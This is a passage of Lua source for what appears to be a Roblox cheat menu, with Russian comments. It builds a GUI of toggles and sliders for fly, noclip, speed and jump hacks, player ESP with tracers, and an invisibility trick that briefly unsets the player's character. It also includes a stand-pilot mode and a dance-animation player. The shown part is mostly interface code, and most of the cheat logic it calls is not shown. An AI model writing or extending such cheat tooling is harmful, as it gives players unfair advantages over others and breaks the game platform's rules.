    SwitchCorner.CornerRadius = UDim.new(1, 0)
    SwitchCorner.Parent = Switch
    
    local toggled = defaultValue
    
    Switch.MouseButton1Click:Connect(function()
        toggled = not toggled
        TweenService:Create(Switch, TweenInfo.new(0.15), {
            BackgroundColor3 = toggled and Color3.fromRGB(60, 140, 220) or Color3.fromRGB(50, 50, 50)
        }):Play()
        if callback then callback(toggled) end
    end)
    
    return Toggle
end

local function createSlider(parent, labelText, min, max, default, callback)
    local Slider = Instance.new("Frame")
    Slider.Size = UDim2.new(1, 0, 0, 24)
    Slider.BackgroundTransparency = 1
    Slider.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.40, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(180, 180, 180)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Slider
    
    local Value = Instance.new("TextLabel")
    Value.Size = UDim2.new(0, 30, 1, 0)
    Value.Position = UDim2.new(1, -30, 0, 0)
    Value.BackgroundTransparency = 1
    Value.Text = tostring(default)
    Value.Font = Enum.Font.Gotham
    Value.TextSize = 12
    Value.TextColor3 = Color3.fromRGB(120, 120, 120)
    Value.TextXAlignment = Enum.TextXAlignment.Right
    Value.Parent = Slider
    
    local SliderBack = Instance.new("Frame")
    SliderBack.Size = UDim2.new(0.45, 0, 0, 3)
    SliderBack.Position = UDim2.new(0.43, 0, 0.5, -1.5)
    SliderBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    SliderBack.BorderSizePixel = 0
    SliderBack.Parent = Slider
    
    local SliderFill = Instance.new("Frame")
    SliderFill.Name = "SliderFill"
    SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    SliderFill.BackgroundColor3 = Color3.fromRGB(60, 140, 220)
    SliderFill.BorderSizePixel = 0
    SliderFill.Parent = SliderBack
    
    local SliderDot = Instance.new("Frame")
    SliderDot.Name = "SliderDot"
    SliderDot.Size = UDim2.new(0, 10, 0, 10)
    SliderDot.Position = UDim2.new((default - min) / (max - min), -5, 0.5, -5)
    SliderDot.BackgroundColor3 = Color3.fromRGB(60, 140, 220)
    SliderDot.BorderSizePixel = 0
    SliderDot.Parent = SliderBack
    
    local DotCorner = Instance.new("UICorner")
    DotCorner.CornerRadius = UDim.new(1, 0)
    DotCorner.Parent = SliderDot
    
    local sliderDragging = false
    
    SliderBack.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliderDragging = true
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliderDragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if sliderDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local mouse = UserInputService:GetMouseLocation().X
            local sliderPos = SliderBack.AbsolutePosition.X
            local sliderSize = SliderBack.AbsoluteSize.X
            
            local percent = math.clamp((mouse - sliderPos) / sliderSize, 0, 1)
            local value = math.floor(min + (max - min) * percent)
            
            Value.Text = tostring(value)
            SliderFill.Size = UDim2.new(percent, 0, 1, 0)
            SliderDot.Position = UDim2.new(percent, -5, 0.5, -5)
            
            if callback then callback(value) end
        end
    end)
    
    return Slider
end

local function createTextBox(parent, labelText, placeholderText, callback)
    local Container = Instance.new("Frame")
    Container.Size = UDim2.new(1, 0, 0, 34)
    Container.BackgroundTransparency = 1
    Container.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.35, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(180, 180, 180)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Container
    
    local TextBox = Instance.new("TextBox")
    TextBox.Size = UDim2.new(0.60, 0, 0, 28)
    TextBox.Position = UDim2.new(0.40, 0, 0.5, -14)
    TextBox.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
    TextBox.Text = ""
    TextBox.PlaceholderText = placeholderText
    TextBox.Font = Enum.Font.Gotham
    TextBox.TextSize = 11
    TextBox.TextColor3 = Color3.fromRGB(200, 200, 200)
    TextBox.BorderSizePixel = 0
    TextBox.Parent = Container
    
    local TextBoxCorner = Instance.new("UICorner")
    TextBoxCorner.CornerRadius = UDim.new(0, 20)
    TextBoxCorner.Parent = TextBox
    
    if callback then
        TextBox.FocusLost:Connect(function()
            callback(TextBox.Text)
        end)
    end
    
    return Container, TextBox
end

local function createButton(parent, text, callback)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 0, 32)
    Button.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
    Button.Text = text
    Button.Font = Enum.Font.Gotham
    Button.TextSize = 12
    Button.TextColor3 = Color3.fromRGB(200, 200, 200)
    Button.BorderSizePixel = 0
    Button.Parent = parent
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 20)
    ButtonCorner.Parent = Button
    
    Button.MouseEnter:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(42, 42, 42)}):Play()
    end)
    Button.MouseLeave:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
    end)
    
    if callback then
        Button.MouseButton1Click:Connect(callback)
    end
    
    return Button
end

-- ========================================
-- INVISIBILITY FUNCTIONS
-- ========================================

function PlayAnimation(HumanoidCharacter, AnimationID, AnimationSpeed, Time)
    HumanoidCharacter = Character
    local CreatedAnimation = Instance.new("Animation")
    CreatedAnimation.AnimationId = AnimationID
    local HumanoidEx = HumanoidCharacter:FindFirstChild("Humanoid")
    
    if not HumanoidEx then
        repeat task.wait() until HumanoidCharacter:FindFirstChild("Humanoid")
        HumanoidEx = HumanoidCharacter:FindFirstChild("Humanoid")
    end
    
    local AnimatorEx = HumanoidEx:FindFirstChild("Animator") or HumanoidEx:WaitForChild("Animator", 3)
    local animationTrack = AnimatorEx:LoadAnimation(CreatedAnimation)

    animationTrack:Play()
    animationTrack:AdjustSpeed(AnimationSpeed)
    animationTrack.Priority = Enum.AnimationPriority.Action4
    animationTrack.TimePosition = Time
    return animationTrack
end

local function Invisibile()
    local HUD = LocalPlayer.PlayerGui:FindFirstChild("HUD")
    if HUD then
        HUD.Parent = game:GetService("StarterGui")
    else
        local S1, F1 = pcall(function()
            game:GetService("StarterGui"):FindFirstChild("HUD").Parent = LocalPlayer.PlayerGui
            HUD = LocalPlayer.PlayerGui:FindFirstChild("HUD")
        end)
        print(S1, F1)
    end

    UndergroundAnimation = PlayAnimation(Character, "rbxassetid://7189062263", 0, 5)
    LocalPlayer.Character = nil

    UndergroundAnimation:Stop()
    LocalPlayer.Character = Character
    
    local Survived, Died = pcall(function()
        if HUD then
            HUD.Parent = LocalPlayer.PlayerGui
        end
    end)
    print(Survived, Died)
    
    Highlight = Instance.new("Highlight")
    Highlight.Parent = Character
    Highlight.Enabled = true
    isInvisible = true
end

local function Uninvisible()
    PlayAnimation(Character, "rbxassetid://7189062263", 0, 5):Stop()
    
    if Highlight then
        Highlight:Destroy()
        Highlight = nil
    end
    isInvisible = false
end

-- ========================================
-- MOVEMENT PAGE
-- ========================================
local MovementPage, MovementLeft, MovementRight
local flyToggleButton = nil
local function toggleFlyState(enabled)
    flyEnabled = enabled
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root and enabled then
        bv = Instance.new("BodyVelocity", root)
        bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        bg = Instance.new("BodyGyro", root)
        bg.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
        print("✈️ Fly ENABLED (Press " .. flyKeybind.Name .. " to toggle)")
    else
        if bv then bv:Destroy(); bv = nil end
        if bg then bg:Destroy(); bg = nil end
        print("🚶 Fly DISABLED")
    end
end


local ColorPickerTheme = {
    Bg = Color3.fromRGB(25, 25, 25),
    Element = Color3.fromRGB(35, 35, 35),
    Accent = Color3.fromRGB(140, 180, 255),
    Text = Color3.fromRGB(220, 220, 220),
    Green = Color3.fromRGB(130, 195, 65),
    Red = Color3.fromRGB(200, 60, 60)
}

local function OpenColorPicker(defaultColor, callback)
    local blocker = Instance.new("Frame", ScreenGui)
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.BackgroundColor3 = Color3.new(0, 0, 0)
    blocker.BackgroundTransparency = 0.5
    blocker.ZIndex = 200
    blocker.Active = true

    local picker = Instance.new("Frame", blocker)
    picker.Size = UDim2.new(0, 300, 0, 380)
    picker.Position = UDim2.new(0.5, -150, 0.5, -190)
    picker.BackgroundColor3 = ColorPickerTheme.Bg
    picker.ZIndex = 201
    picker.Active = true
    Instance.new("UICorner", picker).CornerRadius = UDim.new(0, 20)
    
    local pickerStroke = Instance.new("UIStroke", picker)
    pickerStroke.Color = Color3.fromRGB(60, 60, 70)
    pickerStroke.Thickness = 2
    
    local pickerTitle = Instance.new("TextLabel", picker)
    pickerTitle.Size = UDim2.new(1, 0, 0, 40)
    pickerTitle.BackgroundTransparency = 1
    pickerTitle.Text = "Choose ESP Color"
    pickerTitle.TextColor3 = ColorPickerTheme.Text
    pickerTitle.Font = Enum.Font.GothamBold
    pickerTitle.TextSize = 16
    pickerTitle.ZIndex = 202

    local h, s, v = defaultColor:ToHSV()
    local currentHue = h
    local currentSat = s
    local currentVal = v
    
    local preview = Instance.new("Frame", picker)
    preview.Size = UDim2.new(0, 260, 0, 40)
    preview.Position = UDim2.new(0, 20, 0, 50)
    preview.BackgroundColor3 = defaultColor
    preview.ZIndex = 202
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 20)

    local satVal = Instance.new("TextButton", picker)
    satVal.Size = UDim2.new(0, 260, 0, 180)
    satVal.Position = UDim2.new(0, 20, 0, 100)
    satVal.BackgroundColor3 = Color3.fromHSV(currentHue, 1, 1)
    satVal.BorderSizePixel = 0
    satVal.ZIndex = 202
    satVal.Text = ""
    satVal.AutoButtonColor = false
    Instance.new("UICorner", satVal).CornerRadius = UDim.new(0, 20)

    local whiteGrad = Instance.new("Frame", satVal)
    whiteGrad.Size = UDim2.new(1, 0, 1, 0)
    whiteGrad.BackgroundColor3 = Color3.new(1, 1, 1)
    whiteGrad.BorderSizePixel = 0
    whiteGrad.ZIndex = 203
    
    local whiteGradient = Instance.new("UIGradient", whiteGrad)
    whiteGradient.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(1, 1)
    }
    whiteGradient.Rotation = 0
    Instance.new("UICorner", whiteGrad).CornerRadius = UDim.new(0, 20)
    
    local blackGrad = Instance.new("Frame", satVal)
    blackGrad.Size = UDim2.new(1, 0, 1, 0)
    blackGrad.BackgroundColor3 = Color3.new(0, 0, 0)
    blackGrad.BorderSizePixel = 0
    blackGrad.ZIndex = 204
    
    local blackGradient = Instance.new("UIGradient", blackGrad)
    blackGradient.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(1, 0)
    }
    blackGradient.Rotation = 90
    Instance.new("UICorner", blackGrad).CornerRadius = UDim.new(0, 20)

    local hueFrame = Instance.new("TextButton", picker)
    hueFrame.Size = UDim2.new(0, 260, 0, 25)
    hueFrame.Position = UDim2.new(0, 20, 0, 290)
    hueFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    hueFrame.ZIndex = 202
    hueFrame.Text = ""
    hueFrame.AutoButtonColor = false
    Instance.new("UICorner", hueFrame).CornerRadius = UDim.new(0, 20)

    local hueGrad = Instance.new("UIGradient", hueFrame)
    hueGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
    }

    local function updateColor()
        local finalColor = Color3.fromHSV(currentHue, currentSat, currentVal)
        preview.BackgroundColor3 = finalColor
        satVal.BackgroundColor3 = Color3.fromHSV(currentHue, 1, 1)
        return finalColor
    end

    local hueDragging = false
    
    hueFrame.MouseButton1Down:Connect(function()
        hueDragging = true
    end)
    
    hueFrame.MouseButton1Up:Connect(function()
        hueDragging = false
    end)
    
    hueFrame.MouseLeave:Connect(function()
        hueDragging = false
    end)
    
    hueFrame.MouseMoved:Connect(function(x, y)
        if hueDragging then
            local relX = math.clamp((x - hueFrame.AbsolutePosition.X) / hueFrame.AbsoluteSize.X, 0, 1)
            currentHue = relX
            updateColor()
        end
    end)
    
    hueFrame.MouseButton1Click:Connect(function(x, y)
        local relX = math.clamp((x - hueFrame.AbsolutePosition.X) / hueFrame.AbsoluteSize.X, 0, 1)
        currentHue = relX
        updateColor()
    end)

    local svDragging = false
    
    satVal.MouseButton1Down:Connect(function()
        svDragging = true
    end)
    
    satVal.MouseButton1Up:Connect(function()
        svDragging = false
    end)
    
    satVal.MouseLeave:Connect(function()
        svDragging = false
    end)
    
    satVal.MouseMoved:Connect(function(x, y)
        if svDragging then
            local relX = math.clamp((x - satVal.AbsolutePosition.X) / satVal.AbsoluteSize.X, 0, 1)
            local relY = math.clamp((y - satVal.AbsolutePosition.Y) / satVal.AbsoluteSize.Y, 0, 1)
            currentSat = relX
            currentVal = 1 - relY
            updateColor()
        end
    end)
    
    satVal.MouseButton1Click:Connect(function(x, y)
        local relX = math.clamp((x - satVal.AbsolutePosition.X) / satVal.AbsoluteSize.X, 0, 1)
        local relY = math.clamp((y - satVal.AbsolutePosition.Y) / satVal.AbsoluteSize.Y, 0, 1)
        currentSat = relX
        currentVal = 1 - relY
        updateColor()
    end)

    local okBtn = Instance.new("TextButton", picker)
    okBtn.Size = UDim2.new(0, 120, 0, 40)
    okBtn.Position = UDim2.new(0, 20, 0, 325)
    okBtn.Text = "OK"
    okBtn.BackgroundColor3 = ColorPickerTheme.Green
    okBtn.TextColor3 = Color3.new(1, 1, 1)
    okBtn.Font = Enum.Font.GothamBold
    okBtn.TextSize = 14
    okBtn.ZIndex = 203
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 20)

    local cancelBtn = Instance.new("TextButton", picker)
    cancelBtn.Size = UDim2.new(0, 120, 0, 40)
    cancelBtn.Position = UDim2.new(1, -140, 0, 325)
    cancelBtn.Text = "Cancel"
    cancelBtn.BackgroundColor3 = ColorPickerTheme.Red
    cancelBtn.TextColor3 = Color3.new(1, 1, 1)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 14
    cancelBtn.ZIndex = 203
    Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 20)

    okBtn.MouseButton1Click:Connect(function()
        callback(updateColor())
        blocker:Destroy()
    end)

    cancelBtn.MouseButton1Click:Connect(function()
        blocker:Destroy()
    end)
end

do
MovementPage, MovementLeft, MovementRight = createPage()
MovementPage.Visible = true

local MovementHeader = createSectionHeader("Movement")
MovementHeader.Parent = MovementLeft

flyToggleButton = createToggle(MovementLeft, "Fly", false, toggleFlyState)

local flyKeybindBtn = createButton(MovementLeft, "Fly Key: F [Right Click]", function() end)
flyKeybindBtn.MouseButton2Click:Connect(function()
    waitingForFlyKey = true
    flyKeybindBtn.Text = "Press Any Key..."
    flyKeybindBtn.BackgroundColor3 = Color3.fromRGB(60, 140, 220)
    local connection
    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            flyKeybind = input.KeyCode
            waitingForFlyKey = false
            flyKeybindBtn.Text = "Fly Key: " .. flyKeybind.Name .. " [Right Click]"
            TweenService:Create(flyKeybindBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(32, 32, 32)}):Play()
            connection:Disconnect()
        end
    end)
end)

createSlider(MovementLeft, "Fly Speed", 10, 200, 50, function(value) flySpeed = value end)
createToggle(MovementLeft, "Noclip", false, function(enabled) noclipEnabled = enabled end)

createToggle(MovementLeft, "Speed Hack", false, function(enabled) speedHackEnabled = enabled end)
createSlider(MovementLeft, "Walk Speed", 16, 200, 16, function(value) walkSpeed = value end)

local JumpHeader = createSectionHeader("Jump")
JumpHeader.Parent = MovementRight
createToggle(MovementRight, "Jump Hack", false, function(enabled) jumpHackEnabled = enabled end)
createSlider(MovementRight, "Jump Power", 10, 200, 50, function(value) jumpPower = value end)
end

-- PLAYERS PAGE (ESP)
-- ========================================
local PlayersPage, PlayersLeft, PlayersRight
do
PlayersPage, PlayersLeft, PlayersRight = createPage()

local ESPHeader = createSectionHeader("ESP")
ESPHeader.Parent = PlayersLeft

createToggle(PlayersLeft, "Box ESP", false, function(enabled) espBoxEnabled = enabled end)
createToggle(PlayersLeft, "Name ESP", false, function(enabled) espNameEnabled = enabled end)
createToggle(PlayersLeft, "Distance ESP", false, function(enabled) espDistanceEnabled = enabled end)
createToggle(PlayersLeft, "Tracers", false, function(enabled) espTracerEnabled = enabled end)
createSlider(PlayersLeft, "Text Size", 10, 30, 14, function(value) espFontSize = value end)

-- ESP Color Picker Button
do
    local ColorPickerBtn = Instance.new("TextButton")
    ColorPickerBtn.Size = UDim2.new(1, 0, 0, 35)
    ColorPickerBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    ColorPickerBtn.Text = ""
    ColorPickerBtn.Parent = PlayersLeft
    
    local ColorPickerCorner = Instance.new("UICorner")
    ColorPickerCorner.CornerRadius = UDim.new(0, 20)
    ColorPickerCorner.Parent = ColorPickerBtn
    
    -- Текст слева
    local ColorLabel = Instance.new("TextLabel")
    ColorLabel.Size = UDim2.new(0.6, 0, 1, 0)
    ColorLabel.Position = UDim2.new(0, 10, 0, 0)
    ColorLabel.BackgroundTransparency = 1
    ColorLabel.Text = "ESP Color"
    ColorLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    ColorLabel.Font = Enum.Font.Gotham
    ColorLabel.TextSize = 14
    ColorLabel.TextXAlignment = Enum.TextXAlignment.Left
    ColorLabel.Parent = ColorPickerBtn
    
    -- Превью цвета справа
    local ColorPreview = Instance.new("Frame")
    ColorPreview.Size = UDim2.new(0, 70, 0, 25)
    ColorPreview.Position = UDim2.new(1, -80, 0.5, -12.5)
    ColorPreview.BackgroundColor3 = espBoxColor
    ColorPreview.Parent = ColorPickerBtn
    
    local PreviewCorner = Instance.new("UICorner")
    PreviewCorner.CornerRadius = UDim.new(0, 20)
    PreviewCorner.Parent = ColorPreview
    
    ColorPickerBtn.MouseButton1Click:Connect(function()
        OpenColorPicker(espBoxColor, function(newColor)
            espBoxColor = newColor
            ColorPreview.BackgroundColor3 = newColor
        end)
    end)
    
    ColorPickerBtn.MouseEnter:Connect(function()
        TweenService:Create(ColorPickerBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 140, 220)}):Play()
    end)
    
    ColorPickerBtn.MouseLeave:Connect(function()
        TweenService:Create(ColorPickerBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
    end)
end
end

-- ========================================
-- STAND PILOT PAGE
-- ========================================
local StandPilotPage, StandLeft, StandRight
do
StandPilotPage, StandLeft, StandRight = createPage()

local StandHeader = createSectionHeader("Stand Pilot")
StandHeader.Parent = StandLeft

local standEnabled = false
createToggle(StandLeft, "Enable Stand Pilot [H]", false, function(enabled)
    standEnabled = enabled
    if enabled then
        pcall(EnablePilot)
    else
        pcall(DisablePilot)
    end
end)

createSlider(StandLeft, "Stand Speed", 0.5, 5, 1.5, function(value) settings["standspeed"] = value end)
createSlider(StandLeft, "Jump Power", 0.5, 5, 1.5, function(value) settings["pilotjumppower"] = value end)
createSlider(StandLeft, "Body Distance", 5, 100, 37, function(value) settings["bodydistance"] = value end)
createToggle(StandRight, "Hide Body", true, function(enabled) settings["hidebody"] = enabled end)
createToggle(StandRight, "TP Body to Stand", true, function(enabled) settings["tpbodytostand"] = enabled end)
end

-- ========================================
-- FUN & DANCE PAGE
-- ========================================
local FunPage, FunLeft, FunRight
do
FunPage, FunLeft, FunRight = createPage()

local FunHeader = createSectionHeader("Invisibility")
FunHeader.Parent = FunLeft

createToggle(FunLeft, "Invisibility", false, function(enabled)
    if enabled then pcall(Invisibile) else pcall(Uninvisible) end
end)

local DanceHeader = createSectionHeader("Animations")
DanceHeader.Parent = FunRight

createButton(FunRight, "🛑 Stop All Animations", function() stopAllAnimations() end)

-- Dropdown для анимаций
local AnimDropdownBtn = Instance.new("TextButton")
AnimDropdownBtn.Size = UDim2.new(1, 0, 0, 35)
AnimDropdownBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
AnimDropdownBtn.Text = "▼ Animation List"
AnimDropdownBtn.Font = Enum.Font.Gotham
AnimDropdownBtn.TextSize = 13
AnimDropdownBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
AnimDropdownBtn.TextXAlignment = Enum.TextXAlignment.Left
AnimDropdownBtn.BorderSizePixel = 0
AnimDropdownBtn.Parent = FunRight

local AnimDBCorner = Instance.new("UICorner")
AnimDBCorner.CornerRadius = UDim.new(0, 20)
AnimDBCorner.Parent = AnimDropdownBtn

local AnimDBPadding = Instance.new("UIPadding")
AnimDBPadding.PaddingLeft = UDim.new(0, 12)
AnimDBPadding.Parent = AnimDropdownBtn

-- Контейнер для выпадающего списка
local AnimDropdownContainer = Instance.new("Frame")
AnimDropdownContainer.Size = UDim2.new(1, 0, 0, 0)
AnimDropdownContainer.Position = UDim2.new(0, 0, 1, 2)
AnimDropdownContainer.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
AnimDropdownContainer.BorderSizePixel = 0
AnimDropdownContainer.Visible = false
AnimDropdownContainer.ZIndex = 100
AnimDropdownContainer.ClipsDescendants = true
AnimDropdownContainer.Parent = AnimDropdownBtn

local AnimDCCorner = Instance.new("UICorner")
AnimDCCorner.CornerRadius = UDim.new(0, 20)
AnimDCCorner.Parent = AnimDropdownContainer

-- Поиск внутри dropdown
local AnimSearchFrame = Instance.new("Frame")
AnimSearchFrame.Size = UDim2.new(1, -8, 0, 30)
AnimSearchFrame.Position = UDim2.new(0, 4, 0, 4)
AnimSearchFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
AnimSearchFrame.BorderSizePixel = 0
AnimSearchFrame.ZIndex = 101
AnimSearchFrame.Parent = AnimDropdownContainer

local AnimSearchCorner = Instance.new("UICorner")
AnimSearchCorner.CornerRadius = UDim.new(0, 15)
AnimSearchCorner.Parent = AnimSearchFrame

local AnimSearchBox = Instance.new("TextBox")
AnimSearchBox.Size = UDim2.new(1, -12, 1, -4)
AnimSearchBox.Position = UDim2.new(0, 6, 0, 2)
AnimSearchBox.BackgroundTransparency = 1
AnimSearchBox.Text = ""
AnimSearchBox.PlaceholderText = "🔍 Search animations..."
AnimSearchBox.Font = Enum.Font.Gotham
AnimSearchBox.TextSize = 11
AnimSearchBox.TextColor3 = Color3.fromRGB(200, 200, 200)
AnimSearchBox.TextXAlignment = Enum.TextXAlignment.Left
AnimSearchBox.BorderSizePixel = 0
AnimSearchBox.ZIndex = 102
AnimSearchBox.Parent = AnimSearchFrame

-- Scroll для анимаций
local AnimScroll = Instance.new("ScrollingFrame")
AnimScroll.Size = UDim2.new(1, -8, 1, -42)
AnimScroll.Position = UDim2.new(0, 4, 0, 38)
AnimScroll.BackgroundTransparency = 1
AnimScroll.ScrollBarThickness = 3
AnimScroll.ScrollBarImageColor3 = Color3.fromRGB(60, 140, 220)
AnimScroll.BorderSizePixel = 0
AnimScroll.ZIndex = 101
AnimScroll.Parent = AnimDropdownContainer

local AnimLayout = Instance.new("UIListLayout")
AnimLayout.Padding = UDim.new(0, 3)
AnimLayout.Parent = AnimScroll

local animButtons = {}
local animDropdownOpen = false

local function playAnimation(data)
    if LocalPlayer.Character then
        local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            for k, conn in pairs(animPlayerConnections) do
                if conn and typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end
            end
            animPlayerConnections = {}
            for k, t in pairs(animPlayerActive) do if t then pcall(function() t:Stop() end) end end
            animPlayerActive = {}
            
            if data.name == "Twerk" then
                local key = "twerk"
                local animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://12874447851"
                local animTrack = humanoid:LoadAnimation(animation)
                animTrack.Looped = true
                local speed = data.speed or 1.5
                animTrack:Play(0, 1, speed)
                animTrack.TimePosition = data.timepos or 3.9
                animPlayerActive[key] = animTrack
                
                local startTime, endTime = 3.90, 5.10
                local isReverse, isPlaying = false, false
                local conn = RunService.Heartbeat:Connect(function()
                    if not animTrack or not animTrack.IsPlaying and not animTrack.Looped then return end
                    if not isPlaying then
                        isPlaying = true
                        if not isReverse then
                            animTrack:Play(0, 1, speed)
                            animTrack.TimePosition = startTime
                        else
                            animTrack:Play(0, 1, -speed)
                            animTrack.TimePosition = endTime
                        end
                    end
                    local currentTime = animTrack.TimePosition
                    if not isReverse and currentTime >= endTime then
                        isReverse, isPlaying = true, false
                    elseif isReverse and currentTime <= startTime then
                        isReverse, isPlaying = false, false
                    end
                end)
                animPlayerConnections[key] = conn
            else
                local animation = Instance.new("Animation")
                animation.AnimationId = "rbxassetid://" .. tostring(data.id)
                local track = humanoid:LoadAnimation(animation)
                track:Play()
                track.Looped = data.looped
                track.TimePosition = data.timepos or 0
                if data.speed and type(data.speed) == "number" and data.speed > 0 then
                    pcall(function() track:AdjustSpeed(data.speed) end)
                end
                pcall(function() track:AdjustWeight(999) end)
                local key = tostring(data.id)
                animPlayerActive[key] = track
                if data.freezeonend then
                    local connection
                    connection = track.Stopped:Connect(function()
                        if humanoid and humanoid.Parent then
                            humanoid.AutoRotate = false
                            humanoid.WalkSpeed = 0
                            humanoid.JumpPower = 0
                        end
                        if connection then connection:Disconnect() end
                    end)
                end
            end
        end
    end
end

-- Создаём кнопки анимаций в dropdown
for _, anim in ipairs(animations) do
    local emoji = "🎵"
    if anim.name == "Twerk" then emoji = "💃"
    elseif anim.name == "Dog" then emoji = "🐕"
    elseif anim.name == "Plane" then emoji = "✈️"
    elseif anim.name == "Float" then emoji = "🧘"
    elseif anim.name == "Snake" then emoji = "🐍"
    elseif anim.name == "Sit" or anim.name == "Sad Sit" or anim.name == "Cat Sit" or anim.name == "Sway Sit" or anim.name == "Sway Sit 2" or anim.name == "Cute Stomach Lay" then emoji = "🪑"
    elseif anim.name == "Fake Death" or anim.name == "Peter Griffin Death" then emoji = "💀"
    elseif anim.name == "Basketball Head Spin" then emoji = "🏀"
    elseif anim.name == "Car" or anim.name == "Tank" then emoji = "🚗"
    elseif anim.name == "Ragdoll" then emoji = "🤕"
    elseif anim.name == "Helicopter" or anim.name == "Helicopter 2" or anim.name == "Helicopter 3" then emoji = "🚁"
    elseif anim.name == "Silver Surfer" then emoji = "🏄"
    elseif anim.name == "Skibidi Toilet" then emoji = "🚽"
    end
    
    local AnimBtn = Instance.new("TextButton")
    AnimBtn.Size = UDim2.new(1, -6, 0, 32)
    AnimBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    AnimBtn.Text = emoji .. " " .. anim.name
    AnimBtn.Font = Enum.Font.Gotham
    AnimBtn.TextSize = 12
    AnimBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    AnimBtn.TextXAlignment = Enum.TextXAlignment.Left
    AnimBtn.BorderSizePixel = 0
    AnimBtn.ZIndex = 102
    AnimBtn.Parent = AnimScroll
    
    local ABCorner = Instance.new("UICorner")
    ABCorner.CornerRadius = UDim.new(0, 15)
    ABCorner.Parent = AnimBtn
    
    local ABPadding = Instance.new("UIPadding")
    ABPadding.PaddingLeft = UDim.new(0, 10)
    ABPadding.Parent = AnimBtn
    
    AnimBtn.MouseEnter:Connect(function()
        TweenService:Create(AnimBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 140, 220)}):Play()
    end)
    
    AnimBtn.MouseLeave:Connect(function()
        TweenService:Create(AnimBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
    end)
    
    AnimBtn.MouseButton1Click:Connect(function()
        playAnimation(anim)
        AnimDropdownBtn.Text = "▼ " .. anim.name
    end)
    
    table.insert(animButtons, AnimBtn)
end

-- Обновляем canvas size
AnimScroll.CanvasSize = UDim2.new(0, 0, 0, AnimLayout.AbsoluteContentSize.Y + 8)
AnimLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    AnimScroll.CanvasSize = UDim2.new(0, 0, 0, AnimLayout.AbsoluteContentSize.Y + 8)
end)

-- Обработчик открытия/закрытия dropdown
AnimDropdownBtn.MouseButton1Click:Connect(function()
    animDropdownOpen = not animDropdownOpen
    
    if animDropdownOpen then
        AnimDropdownContainer.Visible = true
        AnimDropdownContainer.Size = UDim2.new(1, 0, 0, 0)
        local targetHeight = math.min(#animations * 35 + 42, 300)
        TweenService:Create(AnimDropdownContainer, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, targetHeight)}):Play()
    else
        TweenService:Create(AnimDropdownContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 0, 0)}):Play()
        task.wait(0.2)
